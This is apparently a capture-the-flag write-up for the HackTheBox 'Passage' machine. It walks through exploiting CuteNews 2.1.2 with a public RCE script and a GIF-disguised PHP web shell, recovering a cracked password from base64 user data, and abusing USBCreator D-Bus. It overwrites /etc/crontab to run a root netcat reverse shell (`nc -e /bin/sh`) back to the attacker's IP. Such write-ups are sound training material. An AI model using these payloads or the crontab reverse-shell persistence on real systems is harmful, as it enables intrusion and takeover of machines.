---
title: "HackTheBox: Passage"
excerpt: "Passage was an interesting machine, the initial foothold was quite trivial as it mostly involved a CVE to get a foothold in the system, the privilege escalation was a bit more difficult but nothing we really haven't seen before from other machines, which involves finding a hash for the user paul and then getting the ssh keys for Nadav in which we then exploit USBCreator D-Bus for root."
tags:
  - HackTheBox
  - boot2root
  - cve
  - easy
  - privilege escalation
  - hardcoded credentials  
---

# HackTheBox: Passage
![HTBCover](/assets/images/htb/passage/HTBcover.png)

Passage was an interesting machine, the initial foothold was quite trivial as it mostly involved a CVE to get a foothold in the system, the privilege escalation was a bit more difficult but nothing we really haven't seen before from other machines, which involves finding a hash for the user paul and then getting the ssh keys for Nadav in which we then exploit USBCreator D-Bus for root.

## Recon / Enumeration

I usually start off with doing a full port scan `nmap -p- 10.10.10.206` to make sure to not miss any ports during the start of recon, and after I've done a full port scan I usually do a `nmap <ip> -p<ports> -sV -sC -A`. 

```
┌─[root@parrot]─[/home/utopia/Documents/HTB/writeups/passage]
└──╼ #nmap -p80,22 10.10.10.206 -sV -sC -A  
Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-06 00:25 EST
Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 00:25 (0:00:00 remaining)
Nmap scan report for 10.10.10.206
Host is up (0.034s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Passage News
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), Linux 3.18 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.10 - 4.11 (93%), Oracle VM Server 3.4.2 (Linux 4.1) (93%), Linux 3.12 (93%), Linux 3.13 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   34.96 ms 10.10.14.1
2   34.94 ms 10.10.10.206

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.44 seconds
```

As we can see, there are two ports open, SSH and HTTP, from experience we'll usually ignore SSH as it's rarely ever vulnerable to anything and these types of machines, especially linux ones involve exploiting the web application manually or with a CVE.

## Enumerating HTTP

Checking out the HTTP service and visiting in the browser reveals this page:

![webpage](/assets/images/htb/passage/webpage.png)

Looks like a CMS from my initial thoughts, scrolling down reveals `© Passage News 2020` which shows us that the date is static meaning we can probably fingerprint the version of this specific software, but it also reveals the CMS software name too.

![cms-software](/assets/images/htb/passage/cms.png)

We also see a blog post indicating that fail2ban is implemented, which is very good to know as some exploits require some kind of blind error-based / time based exploitation, which means we'll maybe have to put make it sleep in between requests to not intiiate fail2ban, but in this case with all the information I've gathered so far I do a searchsploit to check for any public exploit code.

```
┌─[✗]─[root@parrot]─[/home/utopia/Documents/HTB/writeups]                                                                     
└──╼ #searchsploit cutenews                                                                                                   
-------------------------------------------------------------------------- ---------------------------------                  
 Exploit Title                                                            |  Path                                             
-------------------------------------------------------------------------- ---------------------------------                  
CuteNews - 'page' Local File Inclusion                                    | php/webapps/15208.txt                             
CuteNews 0.88 - 'comments.php' Remote File Inclusion                      | php/webapps/22285.txt                             
CuteNews 0.88 - 'search.php' Remote File Inclusion                        | php/webapps/22284.txt                             
CuteNews 0.88 - 'shownews.php' Remote File Inclusion                      | php/webapps/22283.txt                             
CuteNews 0.88/1.3 - 'example1.php' Cross-Site Scripting                   | php/webapps/24238.txt                             
CuteNews 0.88/1.3 - 'example2.php' Cross-Site Scripting                   | php/webapps/24239.txt                             
CuteNews 0.88/1.3 - 'show_archives.php' Cross-Site Scripting              | php/webapps/24240.txt                             
CuteNews 0.88/1.3.x - 'index.php' Cross-Site Scripting                    | php/webapps/24566.txt                             
CuteNews 1.1.1 - 'html.php' Remote Code Execution                         | php/webapps/4851.txt                              
CuteNews 1.3 - Comment HTML Injection                                     | php/webapps/24290.txt                             
CuteNews 1.3 - Debug Query Information Disclosure                         | php/webapps/23406.txt                      
CuteNews 1.3.1 - 'show_archives.php' Cross-Site Scripting                 | php/webapps/24372.txt
CuteNews 1.3.6 - 'result' Cross-Site Scripting                            | php/webapps/29217.txt
CuteNews 1.4.0 - Shell Injection / Remote Command Execution               | php/webapps/1221.php 
CuteNews 1.4.1 - 'categories.mdu' Remote Command Execution                | php/webapps/1400.pl  
CuteNews 1.4.1 - 'function.php' Local File Inclusion                      | php/webapps/1612.php 
CuteNews 1.4.1 - 'search.php' Multiple Cross-Site Scripting Vulnerabiliti | php/webapps/27819.txt
CuteNews 1.4.1 - 'show_archives.php' Traversal Arbitrary File Access      | php/webapps/26465.txt
CuteNews 1.4.1 - 'show_news.php' Cross-Site Scripting                     | php/webapps/27252.txt
CuteNews 1.4.1 - 'template' Traversal Arbitrary File Access               | php/webapps/26466.txt
CuteNews 1.4.1 - Multiple Cross-Site Scripting Vulnerabilities            | php/webapps/27740.txt
CuteNews 1.4.1 - Shell Injection / Remote Command Execution               | php/webapps/1289.php 
CuteNews 1.4.5 - 'rss_title' Cross-Site Scripting                         | php/webapps/29159.txt
CuteNews 1.4.5 - 'show_news.php' Cross-Site Scripting                     | php/webapps/29158.txt
CuteNews 1.4.5 - Admin Password md5 Hash Fetching                         | php/webapps/4779.php 
CuteNews 1.4.6 - 'from_date_day' Full Path Disclosure                     | php/webapps/33341.txt                             
CuteNews 1.4.6 - 'index.php' Cross-Site Request Forgery (New User Creatio | php/webapps/33344.txt                             
CuteNews 1.4.6 - 'index.php' Multiple Cross-Site Scripting Vulnerabilitie | php/webapps/33340.txt                             
CuteNews 1.4.6 - 'ip ban' Authorized Cross-Site Scripting / Command Execu | php/webapps/7700.php                              
CuteNews 1.4.6 - 'result' Cross-Site Scripting                            | php/webapps/33343.txt                             
CuteNews 1.4.6 - 'search.php' Multiple Cross-Site Scripting Vulnerabiliti | php/webapps/33342.txt                             
CuteNews 1.4.6 editnews Module - doeditnews Action Admin Moderation Bypas | php/webapps/33345.txt                             
CuteNews 2.0.3 - Arbitrary File Upload                                    | php/webapps/37474.txt                             
CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit)              | php/remote/46698.rb                               
CuteNews 2.1.2 - Arbitrary File Deletion                                  | php/webapps/48447.txt                             
CuteNews 2.1.2 - Authenticated Arbitrary File Upload                      | php/webapps/48458.txt                             
CuteNews 2.1.2 - Remote Code Execution                                    | php/webapps/48800.py                              
CuteNews aj-fork - 'path' Remote File Inclusion                           | php/webapps/32570.txt                             
CuteNews aj-fork 167f - 'cutepath' Remote File Inclusion                  | php/webapps/2891.txt                              
CuteNews and UTF-8 CuteNews - Multiple Vulnerabilities                    | php/webapps/10002.txt                             
CutePHP CuteNews 1.3 - HTML Injection                                     | php/webapps/22842.txt                             
CutePHP CuteNews 1.3.6 - 'x-forwarded-for' Script Injection               | php/webapps/25177.txt                             
CutePHP CuteNews 1.4.1 - 'index.php' Cross-Site Scripting                 | php/webapps/27356.txt                             
CutePHP CuteNews 1.4.1 Editnews Module - Cross-Site Scripting             | php/webapps/27676.txt                             
-------------------------------------------------------------------------- ---------------------------------
```

Yeah, this CMS is clearly very vulnerable, the problem is that I don't know what version it's running, 
By doing some searching you can figure out there is a login panel at `http://10.10.10.206/CuteNews/` which also reveals the exact version CuteNews is running under.
a
![cutenews-version](/assets/images/htb/passage/login.png)


## Exploitation

Going back to our searchsploit again, we can now also filter out and add more specificity to our search

```
┌─[✗]─[root@parrot]─[/home/utopia/Documents/HTB/writeups]
└──╼ #searchsploit cutenews 2.1.2
-------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                              |  Path
-------------------------------------------------------------------------------------------- ---------------------------------
CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit)                                | php/remote/46698.rb
CuteNews 2.1.2 - Arbitrary File Deletion                                                    | php/webapps/48447.txt
CuteNews 2.1.2 - Authenticated Arbitrary File Upload                                        | php/webapps/48458.txt
CuteNews 2.1.2 - Remote Code Execution                                                      | php/webapps/48800.py
-------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Looks like there are a ton of code exec vulnerabilities, but interestingly enough there is even a metasploit module for it, I usually just run metasploit whenever I'm rooting easy machines, but in this case I ran one of the public exploit codes (Don't worry, I analyzed them before running them, as you're supposed to do!!) just to get them out of the way, but generally what this exploit code does it just a PHP file upload through our avatar (through the registration) and makes it file type by using a `GIF89a;` in the start our of file upload to make it think our file is actually an image/GIF, but in the backend is actually executes our PHP code, here is an example:

```
┌─[root@parrot]─[/home/utopia/Documents/HTB/writeups]
└──╼ #cat shell.php 
GIF89a;

<?php system($_GET['cmd']) ?>
┌─[root@parrot]─[/home/utopia/Documents/HTB/writeups]
└──╼ #file shell.php 
shell.php: GIF image data, version 89a, 2619 x 15370
```

```
┌─[root@parrot]─[/home/utopia/Documents/HTB/writeups]                                                                         
└──╼ #searchsploit -m php/webapps/48800.py                                                                                    
  Exploit: CuteNews 2.1.2 - Remote Code Execution                                                                             
      URL: https://www.exploit-db.com/exploits/48800                                                                          
     Path: /usr/share/exploitdb/exploits/php/webapps/48800.py                                                                 
File Type: Python script, ASCII text executable, with CRLF line terminators                                                   
                                                                                                                              
Copied to: /home/utopia/Documents/HTB/writeups/48800.py                                       

┌─[root@parrot]─[/home/utopia/Documents/HTB/writeups]                                                                         
└──╼ #python3 48800.py                                        
                                                              
                               
                               
           _____     __      _  __                     ___   ___  ___ 
          / ___/_ __/ /____ / |/ /__ _    _____       |_  | <  / |_  |
         / /__/ // / __/ -_)    / -_) |/|/ (_-<      / __/_ / / / __/ 
         \___/\_,_/\__/\__/_/|_/\__/|__,__/___/     /____(_)_(_)____/ 
                                ___  _________                         
                               / _ \/ ___/ __/                         
                              / , _/ /__/ _/                           
                             /_/|_|\___/___/                           
                                                                       
                                                              



[->] Usage python3 expoit.py

Enter the URL> http://10.10.10.206
================================================================
Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
================================================================
7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
================================================================

=============================
Registering a users
=============================
[+] Registration successful with username: 4KEwugSNsY and password: 4KEwugSNsY

=======================================================
Sending Payload
=======================================================
signature_key: e9ddd34fc592ae55bff38cd6214922e1-4KEwugSNsY
signature_dsi: 5f709436967bc29b5022a7cb0c143199
logged in user: 4KEwugSNsY
============================
Dropping to a SHELL
============================

command > ls
avatar_4KEwugSNsY_4KEwugSNsY.php
avatar_egre55_ykxnacpt.php
avatar_hacker_jpyoyskt.php
avatar_testing_file.php
```
Okay, seems like we have code exec! That's awesome! After getting a RCE on a system via any means I immediately switch to a netcat shell as it's usually much more stable and better,

![ncshell](/assets/images/htb/passage/ncshell.png)

### Privilege escalation

Switch my tty to a bash shell to make it more usable

```
┌─[utopia@parrot]─[~]
└──╼ $nc -lvnp 1515
listening on [any] 1515 ...
connect to [10.10.14.150] from (UNKNOWN) [10.10.10.206] 35244
ls
avatar_4KEwugSNsY_4KEwugSNsY.php
avatar_egre55_ykxnacpt.php
avatar_hacker_jpyoyskt.php
avatar_testing_file.php
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@passage:/var/www/html/CuteNews/uploads$ export TERM=xterm
export TERM=xterm
www-data@passage:/var/www/html/CuteNews/uploads$ stty rows 40 cols 126
stty rows 40 cols 126
www-data@passage:/var/www/html/CuteNews/uploads$ ^Z
┌─[✗]─[utopia@parrot]─[~]
└──╼ $stty raw -echo
```

Now I can finally use my shell almost as smoothly as an SSH shell.


I'll enumerate the users quickly:

```
www-data@passage:/var/www$ ls /home                           
nadav  paul                                                    
www-data@passage:/var/www$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash                            
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin               
sys:x:3:3:sys:/dev:/usr/sbin/nologin             
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
nadav:x:1000:1000:Nadav,,,:/home/nadav:/bin/bash
paul:x:1001:1001:Paul Coles,,,:/home/paul:/bin/bash
sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
```

Now, once I've gotten a shell on any type of web application software, especially ones that are managed with databases, I always try to loot for configuration files, as they'll likely end up having a ton of useful information such as hard coded database credentials. In this case it did, if you visit `/var/www/html/CuteNews/cdata/users` and `cat lines` you see a bunch of base64 encoded strings, decoding one of them reveals credentials to the user 'paul'

```
┌─[root@parrot]─[/home/utopia/Documents/HTB/Boxes/Passage]
└──╼ #echo "YToxOntzOjQ6Im5hbWUiO2E6MTp7czoxMDoicGF1bC1jb2xlcyI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMjM2IjtzOjQ6Im5hbWUiO3M6MTA6InBhdWwtY29sZXMiO3M6MzoiYWNsIjtzOjE6IjIiO3M6NToiZW1haWwiO3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6NDoibmljayI7czoxMDoiUGF1bCBDb2xlcyI7czo0OiJwYXNzIjtzOjY0OiJlMjZmM2U4NmQxZjgxMDgxMjA3MjNlYmU2OTBlNWQzZDYxNjI4ZjQxMzAwNzZlYzZjYjQzZjE2ZjQ5NzI3M2NkIjtzOjM6Imx0cyI7czoxMDoiMTU5MjQ4NTU1NiI7czozOiJiYW4iO3M6MToiMCI7czozOiJjbnQiO3M6MToiMiI7fX19" | base64 -d
a:1:{s:4:"name";a:1:{s:10:"paul-coles";a:9:{s:2:"id";s:10:"1592483236";s:4:"name";s:10:"paul-coles";s:3:"acl";s:1:"2";s:5:"email";s:16:"paul@passage.htb";s:4:"nick";s:10:"Paul Coles";s:4:"pass";s:64:"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd";s:3:"lts";s:10:"1592485556";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}
```

john couldn't crack the hash, but crackstation managed to, the password is `atlanta1` 

Okay, we use `su` and use our gathered credentials and it works.

```
www-data@passage:/var/www/html/CuteNews/cdata/users$ su paul 
Password: 
paul@passage:/var/www/html/CuteNews/cdata/users$ cd ~
paul@passage:~$ ls -al
total 112
drwxr-x--- 16 paul paul 4096 Feb  5 06:30 .
drwxr-xr-x  4 root root 4096 Jul 21  2020 ..
----------  1 paul paul    0 Jul 21  2020 .bash_history
-rw-r--r--  1 paul paul  220 Aug 31  2015 .bash_logout
-rw-r--r--  1 paul paul 3770 Jul 21  2020 .bashrc
drwx------ 10 paul paul 4096 Sep  1  2020 .cache
drwx------ 14 paul paul 4096 Aug 24  2020 .config
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Desktop
-rw-r--r--  1 paul paul   25 Aug 24  2020 .dmrc
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Documents
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Downloads
-rw-r--r--  1 paul paul 8980 Apr 20  2016 examples.desktop
drwx------  2 paul paul 4096 Aug 24  2020 .gconf
drwx------  3 paul paul 4096 Feb  5 06:58 .gnupg
-rw-------  1 paul paul 1936 Feb  5 06:30 .ICEauthority
drwx------  3 paul paul 4096 Aug 24  2020 .local
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Music
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Pictures
-rw-r--r--  1 paul paul  655 May 16  2017 .profile
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Public
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 .ssh
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Templates
-r--------  1 paul paul   33 Mar  6 06:02 user.txt
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Videos
-rw-------  1 paul paul   52 Feb  5 06:30 .Xauthority
-rw-------  1 paul paul 1304 Feb  5 06:58 .xsession-errors
-rw-------  1 paul paul 1180 Feb  5 04:42 .xsession-errors.old
paul@passage:~$
```

Okay, cool we have user now!

## Esclate to nadav (user #2)

This was suprisingly easy, to pwn nadav we just grab nadav's private keys located in paul's .ssh directory.

```
┌─[root@parrot]─[/home/utopia/Documents/HTB/Boxes/Passage]
└──╼ #ssh -i ssh.key nadav@10.10.10.206
load pubkey "ssh.key": invalid format
The authenticity of host '10.10.10.206 (10.10.10.206)' can't be established.
ECDSA key fingerprint is SHA256:oRyj2rNWOCrVh9SCgFGamjppmxqJUlGgvI4JSVG75xg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.206' (ECDSA) to the list of known hosts.
Last login: Sat Mar  6 06:14:37 2021 from 10.10.14.122
nadav@passage:~$ 
```
Now, escalating from root from here was quite difficult and would have purely lied on your intuition. 

I check file artifics such as .viminfo and it reveals a specific folder:

```
nadav@passage:~$ cat .viminfo                                                                                                 
# This viminfo file was generated by Vim 7.4.                                                                                 
# You may edit it if you're careful!                                                                                          
                                                                                                                              
# Value of 'encoding' when this file was written
*encoding=utf-8                                                

                                                               
# hlsearch on (H) or off (h):
~h
# Last Substitute Search Pattern:                         
~MSle0~&AdminIdentities=unix-group:root
                               
# Last Substitute String:
$AdminIdentities=unix-group:sudo

# Command Line History (newest to oldest):
:wq
:%s/AdminIdentities=unix-group:root/AdminIdentities=unix-group:sudo/g

# Search String History (newest to oldest):
? AdminIdentities=unix-group:root

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Input Line History (newest to oldest):

# Registers:

# File marks:
'0  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
'1  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

# Jumplist (newest first):
-'  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-'  1  0  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-'  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-'  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-'  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-'  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

# History of marks within files (newest to oldest):

> /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
        "       12      7

> /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
        "       2       0
        .       2       0
        +       2       0
```

That `/etc/dbus-1/system.d/com.ubuntu.USBCreator.conf` thing looked very interesting and suspicious. Searching for "USBCreator" yields a lot of results, but

We can copy the root flag with this command:

`gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /output.txt true`

```
nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /output.txt true
()
nadav@passage:~$ cat /output.txt
492c733f**********0f6b3f5569195
```

But, in real engagements we're looking for root, not some pesky root flag! To get root it's actually quite easy, basically we can just write our own crontab file and make it execute a netcat shell as the root user for us every minute, landing us persistence (albeit not stealthy at all) and a root shell!

```
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
nadav@passage:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
nadav@passage:/tmp$ vim cron.txt
nadav@passage:/tmp$ cat cron.txt
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    nc -e /bin/sh 10.10.14.150 9191
#
nadav@passage:/tmp$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /tmp/cron.txt /etc/crontab true
()
nadav@passage:/tmp$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    nc -e /bin/sh 10.10.14.150 9191
#
```

And after a minute of waiting, nc catches the shell!

```
┌─[root@parrot]─[/home/utopia/Documents/HTB/Boxes/Passage]
└──╼ #nc -lvnp 9191
listening on [any] 9191 ...
connect to [10.10.14.150] from (UNKNOWN) [10.10.10.206] 52216
whoami
root
python3 -c 'import pty; pty.spawn("/bin/bash")'
root@passage:~# ls
ls
artifacts  files  root.txt
root@passage:~# cat root.txt
cat root.txt
492c733f*************f6b3f5569195
root@passage:~# 
```

## Summary

This box was a lot more entertaining than I remember it to be, it taught me some very important lessons such as being keen-eyed when it comes to looking at log and config files, properly loot the filesystem for hard coded credentials, and that if john doesn't work then try crackstation or any type of similar service (lol), and to also always check out file artificats left around such as .viminfo. Thank you for reading my writeup and I have you have a good rest of the day.
